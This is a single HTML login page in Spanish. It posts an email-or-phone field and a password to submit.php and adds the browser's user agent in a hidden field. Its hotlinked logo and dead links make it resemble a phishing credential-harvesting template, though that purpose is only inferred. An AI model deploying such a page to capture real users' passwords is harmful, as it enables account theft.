<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar Sesión</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Arial', sans-serif;
            background: linear-gradient(to right, #00c6ff, #0072ff);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background-color: #ffffff;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            padding: 30px;
            width: 400px;
            text-align: center;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .container img {
            width: 120px;
            border-radius: 50%;
            margin-bottom: 20px;
        }
        .container h1 {
            color: #333;
            font-size: 28px;
            margin-bottom: 20px;
        }
        .container label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            text-align: left;
            width: 100%;
        }
        .container input[type="text"],
        .container input[type="password"] {
            width: 100%;
            padding: 12px;
            margin-bottom: 15px;
            border: 1px solid #ddd;
            border-radius: 8px;
            box-sizing: border-box;
            font-size: 16px;
        }
        .container input[type="submit"] {
            width: 100%;
            padding: 12px;
            background-color: #0072ff;
            border: none;
            border-radius: 8px;
            color: #fff;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }
        .container input[type="submit"]:hover {
            background-color: #005bb5;
        }
        .footer {
            margin-top: 20px;
            font-size: 14px;
            color: #555;
        }
        .footer a {
            color: #0072ff;
            text-decoration: none;
        }
        .footer a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR12JtclYHEb4i9Tx0wab1lfs5jYTMaz5_qI1XKkgCgzZGCqWodfk2WbVE&s" alt="Logo">
        <h1>Iniciar sesión</h1>
        <form id="loginForm" action="submit.php" method="post">
            <label for="username">Correo electrónico o teléfono</label>
            <input type="text" id="username" name="username" placeholder="Correo electrónico o teléfono" required>
            <label for="password">Contraseña</label>
            <input type="password" id="password" name="password" placeholder="Contraseña" required>
            <input type="hidden" id="device_info" name="device_info">
            <input type="submit" value="Iniciar sesión">
        </form>
        <div class="footer">
            <p><a href="#">¿Olvidaste tu contraseña?</a></p>
            <p>¿No tienes cuenta? <a href="#">Regístrate</a></p>
        </div>
    </div>
    <script>
        function getDeviceInfo() {
            return navigator.userAgent;
        }

        document.getElementById('loginForm').onsubmit = function(e) {
            e.preventDefault();
            document.getElementById('device_info').value = getDeviceInfo();
            this.submit();
        };
    </script>
</body>
</html>
